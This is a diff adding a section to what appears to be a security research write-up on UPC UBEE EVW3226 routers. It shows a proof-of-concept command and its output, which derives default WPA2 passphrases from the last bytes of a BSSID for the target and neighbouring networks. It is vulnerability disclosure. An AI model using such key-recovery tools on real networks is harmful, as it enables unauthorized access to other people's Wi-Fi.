@@ -743,6 +743,33 @@ Table below shows how BSSID and input MAC address relates on the example:
  This is how router label looks like for our example:
  [![UBEE label](/static/ubee/ubee_label.jpg)](/static/ubee/ubee_label.jpg)
  
+Our [proof-of-concept](https://github.com/yolosec/TODO) generates the following output
+after entering last 3 bytes of BSSID.
+
+```
+./ubee_keys 123456
+
+================================================================================
+ upc_ubee_keys // WPA2 passphrase recovery tool for UPC%07d UBEE EVW3226 devices 
+================================================================================
+by ph4r05, miroc
+
+  your-BSSID: 647C34123456, SSID: UPC3910551, PASS: HAYQQHCS
+
+  near-BSSID: 647C3412344F, SSID: UPC5316036, PASS: OPTXTJKH 
+  near-BSSID: 647C34123450, SSID: UPC0624103, PASS: ZVPKYKCI 
+  near-BSSID: 647C34123451, SSID: UPC0595666, PASS: NRFJHXDX 
+  near-BSSID: 647C34123452, SSID: UPC5434630, PASS: UTVBNYJP 
+  near-BSSID: 647C34123453, SSID: UPC2659797, PASS: IVGDQAMI  <-- 2.4 Ghz
+  near-BSSID: 647C34123454, SSID: UPC2152244, PASS: ZVESFKYD 
+  near-BSSID: 647C34123455, SSID: UPC2870546, PASS: PXKRLPCC  <-- 5.0 GHz
+  near-BSSID: 647C34123456, SSID: UPC3910551, PASS: HAYQQHCS 
+  near-BSSID: 647C34123457, SSID: UPC8366197, PASS: CIIMMAYX 
+  near-BSSID: 647C34123458, SSID: UPC9505606, PASS: VRJXAHPE 
+  near-BSSID: 647C34123459, SSID: UPC7482035, PASS: CQTJPRCB 
+  near-BSSID: 647C3412345A, SSID: UPC3856093, PASS: TUXFTTLL 
+```
+ 
 # Android apps
 
 **RouterKeygen**
